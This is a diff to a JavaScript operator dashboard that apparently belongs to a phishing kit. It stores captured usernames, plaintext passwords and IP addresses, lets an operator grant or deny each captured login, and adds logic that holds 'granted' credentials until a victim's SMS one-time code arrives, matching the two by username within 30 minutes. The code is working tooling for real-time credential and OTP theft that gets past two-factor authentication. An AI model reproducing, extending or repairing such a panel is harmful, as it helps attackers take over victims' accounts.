@@ -162,6 +162,7 @@
   let notificationsEnabled = false;
   const sessions = new Map();
   const smsEntries = new Map();
+  const waitingCredentials = new Map();
 
   async function api(path, options) {
     const response = await fetch(path, options);
@@ -181,15 +182,26 @@
 
       sessions.clear();
       smsEntries.clear();
-      requests.forEach(request => upsertSession({
-        sid: request.id,
-        requestId: request.id,
-        ts: request.timestamp,
-        ip: request.ipAddress,
-        username: request.username,
-        password: request.password,
-        credStatus: request.status || 'pending',
-      }));
+      waitingCredentials.clear();
+      requests.forEach(request => {
+        const credentialStatus =
+          request.status === 'granted'
+            ? 'grant'
+            : request.status === 'denied'
+              ? 'deny'
+              : 'pending';
+        const session = {
+          sid: request.id,
+          requestId: request.id,
+          ts: request.timestamp,
+          ip: request.ipAddress,
+          username: request.username,
+          password: request.password,
+          credStatus: credentialStatus,
+        };
+        if (session.credStatus === 'pending') upsertSession(session);
+        else if (session.credStatus === 'grant') waitingCredentials.set(session.requestId, session);
+      });
 
       smsHistory.forEach(item => upsertVerification({
         sid: item.sessionId,
@@ -363,6 +375,24 @@
         .sort((a, b) => a.distance - b.distance)[0]?.item;
     }
 
+    if (!target) {
+      const otpTime = new Date(value.ts || 0).getTime();
+      const waitingMatch = Array.from(waitingCredentials.values())
+        .filter(item => item.username === value.username)
+        .map(item => ({
+          item,
+          distance: otpTime - new Date(item.ts || 0).getTime(),
+        }))
+        .filter(candidate => candidate.distance >= 0 && candidate.distance <= 30 * 60 * 1000)
+        .sort((a, b) => a.distance - b.distance)[0]?.item;
+
+      if (waitingMatch) {
+        waitingCredentials.delete(waitingMatch.requestId);
+        upsertSession(waitingMatch);
+        target = sessions.get(waitingMatch.sid);
+      }
+    }
+
     if (target) {
       Object.assign(target, {
         otpSessionId: value.sid,
@@ -450,9 +480,21 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ requestId }),
       });
-      session.credStatus = action;
+      const sessionKey = Array.from(sessions.entries()).find(([, item]) => item === session)?.[0];
+      if (action === 'grant') {
+        waitingCredentials.set(session.requestId, {
+          ...session,
+          credStatus: 'grant',
+        });
+      }
+      if (sessionKey) sessions.delete(sessionKey);
       renderRows();
-      addLog(action === 'grant' ? 'ok' : 'err', `Credentials ${action}ed for ${session.username}`);
+      addLog(
+        action === 'grant' ? 'ok' : 'err',
+        action === 'grant'
+          ? `Credentials granted for ${session.username}; waiting for OTP`
+          : `Credentials denied for ${session.username}`,
+      );
     } catch (error) {
       addLog('err', `${action} failed: ${error.message}`);
     }
@@ -488,6 +530,7 @@
       await api('/api/admin/clear-logs', { method: 'POST' });
       sessions.clear();
       smsEntries.clear();
+      waitingCredentials.clear();
       renderRows();
       addLog('ok', 'All login and SMS logs cleared');
     } catch (error) {
